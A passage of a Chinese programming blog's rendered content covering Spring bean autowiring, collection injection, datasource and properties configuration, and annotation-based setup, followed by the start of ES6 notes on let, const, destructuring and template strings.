class="hljs-string">&quot;bookService&quot;</span> <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;com.itheima.service.impl.BookServiceImpl&quot;</span> <span class="hljs-attribute">autowire</span>=<span class="hljs-string">&quot;byType&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><p>但是如果有两个同类型接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;bean <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;com.itheima.dao.impl.BookDaoImpl&quot;</span>/&gt;<br>&lt;bean <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;com.itheima.dao.impl.BookDaoImpl&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><p>就会出现识别错误并报错</p><p>2.根据名称装配</p><p>根据名称我们就需要使用id属性</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;bean <span class="hljs-attribute">id</span>=<span class="hljs-string">&quot;bookDao&quot;</span> <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;com.itheima.dao.impl.BookDaoImpl&quot;</span>/&gt;<br><br>&lt;bean <span class="hljs-attribute">id</span>=<span class="hljs-string">&quot;bookService&quot;</span> <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;com.itheima.service.impl.BookServiceImpl&quot;</span> <span class="hljs-attribute">autowire</span>=<span class="hljs-string">&quot;byName&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><p>但是如果id错误就会返回一个空指针，导致报错</p><p>tips：</p><p>1.自动装配只适用于引用类型的数据，简单类型不可以</p><p>2.自动装配的优先级低于setter注入和构造器注入</p><h4 id="1-4-7-集合注入"><a href="#1-4-7-集合注入" class="headerlink" title="1.4.7 集合注入"></a>1.4.7 集合注入</h4><p>如果我们的bean中需要注入集合类型的元素（数组 list map…）</p><p>按照如下方式装配，name属性指的是：<strong>集合在类中的数据名</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;bookDao&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.itheima.dao.impl.BookDaoImpl&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--数组注入--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;array&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">array</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>100<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>200<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>300<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--list集合注入--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;list&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>itcast<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>itheima<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>boxuegu<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>chuanzhihui<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--set集合注入--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;set&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">set</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>itcast<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>itheima<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>boxuegu<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>boxuegu<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">set</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--map集合注入--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;map&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">map</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">entry</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;country&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;china&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">entry</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;province&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;henan&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">entry</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;city&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;kaifeng&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">map</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--Properties注入--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;properties&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">props</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">prop</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;country&quot;</span>&gt;</span>china<span class="hljs-tag">&lt;/<span class="hljs-name">prop</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">prop</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;province&quot;</span>&gt;</span>henan<span class="hljs-tag">&lt;/<span class="hljs-name">prop</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">prop</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;city&quot;</span>&gt;</span>kaifeng<span class="hljs-tag">&lt;/<span class="hljs-name">prop</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">props</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="1-5-数据库"><a href="#1-5-数据库" class="headerlink" title="1.5 数据库"></a>1.5 数据库</h3><p>使用bean管理数据库对象的时候，需要在bean中写入 driver，url，user，password这几个选项提供链接的条件</p><p>当然还有很多选项：比如最大连接数，链接时间等都可以配置</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&lt;bean <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;dataSource&quot;</span> <span class="hljs-built_in">class</span>=<span class="hljs-string">&quot;com.alibaba.druid.pool.DruidDataSource&quot;</span>&gt;<br>        &lt;<span class="hljs-keyword">property</span> <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;driverClassName&quot;</span> value=<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>/&gt;<br>        &lt;<span class="hljs-keyword">property</span> <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;url&quot;</span> value=<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/spring_db&quot;</span>/&gt;<br>        &lt;<span class="hljs-keyword">property</span> <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;username&quot;</span> value=<span class="hljs-string">&quot;root&quot;</span>/&gt;<br>        &lt;<span class="hljs-keyword">property</span> <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;password&quot;</span> value=<span class="hljs-string">&quot;root&quot;</span>/&gt;<br>&lt;/bean&gt;<br></code></pre></td></tr></table></figure><p>然后在类里面引入这个bean</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-function"><span class="hljs-title">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>)</span> &#123;<br>    ApplicationContext ctx = <span class="hljs-keyword">new</span> ClassPathXmlApplicationContext(<span class="hljs-string">&quot;applicationContext.xml&quot;</span>);<br>    BookDao bookDao = (BookDao)ctx.getBean(<span class="hljs-string">&quot;bookDao&quot;</span>);<br>    bookDao.save();<br>&#125;<br></code></pre></td></tr></table></figure><p>我们还可以对value中的值进行改善</p><p>引入properties文件</p><p>创建一个名为jdbc.properties 的文件（与xml文件同级，也就是resource文件夹下）</p><p>写入：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">jdbc.driver</span>=com.mysql.jdbc.Driver<br><span class="hljs-attr">jdbc.url</span>=jdbc:mysql://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">3306</span>/spring_db<br><span class="hljs-attr">jdbc.username</span>=root<br><span class="hljs-attr">jdbc.password</span>=root<br></code></pre></td></tr></table></figure><p>然后我们就需要引入这个properties文件进入xml，就是开辟新的命名空间</p><p>这里面的context就是我们的新命名空间</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&lt;beans xmlns=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span><br>       xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br>       <span class="hljs-comment">//配置新的xmlns</span><br>       xmlns:context=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span><br>       xsi:schemaLocation=<span class="hljs-string">&quot;</span><br>            http:<span class="hljs-comment">//www.springframework.org/schema/beans</span><br>            http:<span class="hljs-comment">//www.springframework.org/schema/beans/spring-beans.xsd</span><br>            <span class="hljs-comment">//在xsi中加入新空间</span><br>            http:<span class="hljs-comment">//www.springframework.org/schema/context</span><br>            http:<span class="hljs-comment">//www.springframework.org/schema/context/spring-context.xsd</span><br>            <span class="hljs-string">&quot;&gt;</span><br></code></pre></td></tr></table></figure><p>然后引入properties文件</p><p>第一种方法：多了<code>system-properties-mode=&quot;NEVER&quot;/</code>代表忽略系统变量，<strong>以免系统变量和我们properties文件重名</strong></p><p>第二种方法：加载多个properties文件的时候使用</p><p>第三种方式作为第二种方式的简写形式：代表加载所有的properties文件</p><p>如果要加载类路径下的properties文件使用：<code>classpath*：*.properties</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--    2.使用context空间加载properties文件--&gt;</span><br><span class="hljs-comment">&lt;!--    &lt;context:property-placeholder location=&quot;jdbc.properties&quot; system-properties-mode=&quot;NEVER&quot;/&gt;--&gt;</span><br><span class="hljs-comment">&lt;!--    &lt;context:property-placeholder location=&quot;jdbc.properties,jdbc2.properties&quot; system-properties-mode=&quot;NEVER&quot;/&gt;--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">context:property-placeholder</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;classpath:*.properties&quot;</span> <span class="hljs-attr">system-properties-mode</span>=<span class="hljs-string">&quot;NEVER&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><h3 id="1-6-容器"><a href="#1-6-容器" class="headerlink" title="1.6 容器"></a>1.6 容器</h3><p>关于我们ctx容器的加载方式，我们还有其他的类型</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-meta">//</span>        <span class="hljs-string">ApplicationContext ctx = new FileSystemXmlApplicationContext(&quot;D:\\workspace\\spring\\spring_10_container\\src\\main\\resources\\applicationContext.xml&quot;);</span><br><br></code></pre></td></tr></table></figure><p>但是这样写颇为麻烦，所以建议还是<code>ClassPathXmlApplicationContext</code></p><p>还有getbean的方式</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>        BookDao bookDao = (BookDao) ctx.getBean(<span class="hljs-string">&quot;bookDao&quot;</span>);<br><span class="hljs-regexp">//</span>作为一般方式的另一种书写形式<br>BookDao bookDao = ctx.getBean(<span class="hljs-string">&quot;bookDao&quot;</span>,BookDao.class);<br><span class="hljs-regexp">//</span>直接声明是Book.class类型，但是有单一性<br>BookDao bookDao = ctx.getBean(BookDao.class);<br></code></pre></td></tr></table></figure><p>ClassPathXmlApplicationContext的顶层还有beanFactory构建bean</p><h3 id="1-7-注解开发"><a href="#1-7-注解开发" class="headerlink" title="1.7 注解开发"></a>1.7 注解开发</h3><p>我们不再使用app.xml文件书写配置</p><p>使用一个新建的类配置文件，他就是：config包下的文件</p><p>使用<code>@Component(&quot;bookDao&quot;)</code>进行注解，括号中相当于是bean中id的属性</p><p>在xml文件中配置，context命名空间</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&lt;beans xmlns=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span><br>       xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br>       <span class="hljs-comment">//context空间配置</span><br>       xmlns:conetxt=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span><br>       xsi:schemaLocation=<span class="hljs-string">&quot;</span><br>            http:<span class="hljs-comment">//www.springframework.org/schema/context  http://www.springframework.org/schema/context/spring-context.xsd</span><br>            http:<span class="hljs-comment">//www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</span><br></code></pre></td></tr></table></figure><p>然后在下面代替bean写入：scan会扫描base-package下的所有文件中的component注解</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--    注解开发--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">conetxt:component-scan</span> <span class="hljs-attr">base-package</span>=<span class="hljs-string">&quot;com.itheima.dao.impl&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p><strong>tips：如果要运行建议降低jdk版本，我使用的1.8版本运行</strong></p><p>关于<code>@component</code>的衍生注解</p><p>数据层：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-meta">@Repository(<span class="hljs-meta-string">&quot;bookDao&quot;</span>)</span><br></code></pre></td></tr></table></figure><p>业务层：</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-meta">@Service</span><br></code></pre></td></tr></table></figure><p>控制层：</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-meta">@Controller</span><br></code></pre></td></tr></table></figure><h4 id="1-7-1-纯注解开发"><a href="#1-7-1-纯注解开发" class="headerlink" title="1.7.1 纯注解开发"></a>1.7.1 纯注解开发</h4><p>现在我们提供一种全新的方式，不再使用配置文件，而是使用配置类</p><p>先创建一个配置类：写上注解<code>@Configuration</code>代表这是一个注解类和<code>@ComponentScan(&#123;&quot;com.itheima.service&quot;, &quot;com.itheima.dao&quot;&#125;)</code>代表这个类中需要扫描的component</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">package</span> com.itheima.config;<br><br><span class="hljs-keyword">import</span> org.springframework.context.<span class="hljs-keyword">annotation</span>.ComponentScan;<br><span class="hljs-keyword">import</span> org.springframework.context.<span class="hljs-keyword">annotation</span>.Configuration;<br><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-meta">@ComponentScan(&#123;<span class="hljs-meta-string">&quot;com.itheima.service&quot;</span>, <span class="hljs-meta-string">&quot;com.itheima.dao&quot;</span>&#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SpringConfig</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> SpringConfig() &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这时我们就可以删掉我们的xml文件</p><p>转而在main中这样写，使用全新的类形式加载<code>AnnotationConfigApplicationContext(new Class[]&#123;SpringConfig.class&#125;);</code></p><p>剩下的操作和之前类似</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">String</span>[] args)</span> </span>&#123;<br>    ApplicationContext ctx = <span class="hljs-keyword">new</span> <span class="hljs-built_in">AnnotationConfigApplicationContext</span>(<span class="hljs-keyword">new</span> Class[]&#123;SpringConfig.class&#125;);<br>    BookDao bookDao = (BookDao)ctx.<span class="hljs-built_in">getBean</span>(<span class="hljs-string">&quot;bookDao&quot;</span>);<br>    System.out.<span class="hljs-built_in">println</span>(bookDao);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-7-1-生命周期管理"><a href="#1-7-1-生命周期管理" class="headerlink" title="1.7.1 生命周期管理"></a>1.7.1 生命周期管理</h4><p>注解<code>@Scope(&quot;singleton&quot;)</code>实现生成bean是单例</p><p>有关生命周期的注解</p><p>@postConstruct是在触发构造函数之后</p><p>@preDestory是在销毁前</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">//@PostConstruct设置bean的初始化方法</span><br><span class="hljs-meta">@PostConstruct</span><br><span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-function"><span class="hljs-title">init</span>(<span class="hljs-params"></span>)</span> &#123;<br>    System.out.println(<span class="hljs-string">&quot;init ...&quot;</span>);<br>&#125;<br><span class="hljs-comment">//@PreDestroy设置bean的销毁方法</span><br><span class="hljs-meta">@PreDestroy</span><br><span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-function"><span class="hljs-title">destroy</span>(<span class="hljs-params"></span>)</span> &#123;<br>    System.out.println(<span class="hljs-string">&quot;destroy ...&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-8-Spring整合"><a href="#1-8-Spring整合" class="headerlink" title="1.8 Spring整合"></a>1.8 Spring整合</h3><h4 id="1-8-1-mybatis"><a href="#1-8-1-mybatis" class="headerlink" title="1.8.1 mybatis"></a>1.8.1 mybatis</h4>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>EAMCScript6</title>
    <link href="/2022/09/06/EAMC6/"/>
    <url>/2022/09/06/EAMC6/</url>
    
    <content type="html"><![CDATA[<h1 id="EAMCScript-6-11"><a href="#EAMCScript-6-11" class="headerlink" title="EAMCScript 6 - 11"></a>EAMCScript 6 - 11</h1><h2 id="C1-let"><a href="#C1-let" class="headerlink" title="C1.let"></a>C1.let</h2><p>let有几大特性</p><p>1.变量不能重复声明</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-comment">//var 可以重复声明</span><br><span class="hljs-keyword">var</span> star = <span class="hljs-string">&quot;海王星&quot;</span><br><span class="hljs-keyword">var</span> star = <span class="hljs-string">&quot;天王星&quot;</span><br><br><span class="hljs-comment">//let 不能重复声明</span><br><span class="hljs-keyword">let</span> star = <span class="hljs-string">&quot;海王&quot;</span><br><span class="hljs-keyword">let</span> star = <span class="hljs-string">&quot; &quot;</span><span class="hljs-comment">//报错</span><br></code></pre></td></tr></table></figure><p>2.块级作用域</p><p>es6引入了块级作用域，也就是 {} 括起来的作用域，局部变量</p><p>let定义的变量就有块级作用域</p><p>3.变量提升</p><p>面试题常考</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">console</span>.log(star);<br><span class="hljs-keyword">var</span> star = <span class="hljs-string">&quot;海王星&quot;</span><br></code></pre></td></tr></table></figure><p>打印结果 undefined，因为代码顺序是</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">var <span class="hljs-keyword">star</span><br><span class="hljs-built_in">log</span><br><span class="hljs-keyword">star</span> = <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>如果是let</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">console</span>.log(star);<br><span class="hljs-keyword">let</span> star = <span class="hljs-string">&quot;海王星&quot;</span><br></code></pre></td></tr></table></figure><p>结果报错，因为没有变量提升</p><h2 id="C2-const"><a href="#C2-const" class="headerlink" title="C2.const"></a>C2.const</h2><p>const赋值常量也有几大特性</p><p>1.常量的值不能修改，也就是configureable为false</p><p>2.一般使用大写作为常量名</p><p>3.一定要赋予初始值</p><p>4.没有深度遍历</p><p>​    也就是说你可以修改一个数组和对象里面的值</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">const ig = <span class="hljs-selector-attr">[<span class="hljs-string">&#x27;jacky&#x27;</span>,<span class="hljs-string">&#x27;baolan&#x27;</span>,<span class="hljs-string">&#x27;rookie&#x27;</span>,<span class="hljs-string">&#x27;ning&#x27;</span>,<span class="hljs-string">&#x27;shy&#x27;</span>]</span><br>ig<span class="hljs-selector-attr">[0]</span> = <span class="hljs-string">&#x27;wxz&#x27;</span><br><br><span class="hljs-comment">//但是这样就会报错</span><br>ig = <span class="hljs-string">&#x27;fpx&#x27;</span><br></code></pre></td></tr></table></figure><p>5.块级作用域</p><h2 id="C3-数组解构"><a href="#C3-数组解构" class="headerlink" title="C3.数组解构"></a>C3.数组解构</h2><p>1.数组结构</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> ig = [<span class="hljs-string">&#x27;ad&#x27;</span>,<span class="hljs-string">&#x27;top&#x27;</span>,<span class="hljs-string">&#x27;mid&#x27;</span>]<br><span class="hljs-keyword">let</span> [j,t,r] = ig<br><span class="hljs-built_in">console</span>.log(t);<br></code></pre></td></tr></table></figure><p>2.对象解构</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vbscript"><span class="hljs-keyword">const</span> fushan = &#123;<br>    top1: <span class="hljs-comment">&#x27;shy&#x27;,</span><br>    <span class="hljs-keyword">get</span>: <span class="hljs-keyword">function</span>()&#123;<br>            console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;剑姬&quot;</span>);<br>    &#125;<br>&#125;;<br><span class="hljs-keyword">let</span> &#123;top1, <span class="hljs-keyword">get</span>&#125; = fushan<br>console.<span class="hljs-built_in">log</span>(top1);<br><span class="hljs-keyword">get</span>();<br></code></pre></td></tr></table></figure><p>这里最常用的就是解构对象的方法，直接使用方法名调用</p><h2 id="C4-模板字符串"><a href="#C4-模板字符串" class="headerlink" title="C4.模板字符串"></a>C4.模板字符串</h2><p>主要用于字符串的拼接和简化换行显示</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> str = <span class="hljs-string">`i </span><br><span class="hljs-string">           am a </span><br><span class="hljs-string">           string`</span>;<br><span class="hljs-built_in">console</span>.log(str);<br><span class="hljs-keyword">let</span> lovest = <span class="hljs-string">&#x27;卡莎&#x27;</span><br><span class="hljs-keyword">let</span> out = <span class="hljs-string">`<span class="hljs-subst">$&#123;lovest&#125;</span> is best`</span><br><span class="hljs-built_in">console</span>.log(out);<br></code></pre></td></tr></table></figure><h2 id="C5-对象简化"><a href="#C5-对象简化" class="headerlink" title="C5.对象简化"></a>C5.对象简化</h2><p>支持简化书写对象</p><p>本来<code>godv</code>对象中需要写成</p><p><code>god：god，</code></p><p><code>oppsite：oppsite</code></p><p>现在省去多余的代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> god = 